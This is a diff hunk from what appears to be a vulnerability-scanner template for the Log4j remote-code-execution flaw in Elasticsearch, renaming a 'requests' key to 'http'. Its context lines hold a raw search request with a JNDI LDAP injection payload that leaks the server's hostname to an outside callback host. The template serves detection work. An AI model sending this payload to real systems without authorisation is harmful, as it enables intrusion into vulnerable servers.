@@ -10,7 +10,7 @@ info:
     - https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
   tags: rce,jndi,log4j,elastic,elasticsearch
 
-requests:
+http:
   - raw:
       - |
         GET /_search?source=${jndi:ldap://${hostName}.{{interactsh-url}}/x} HTTP/1.1
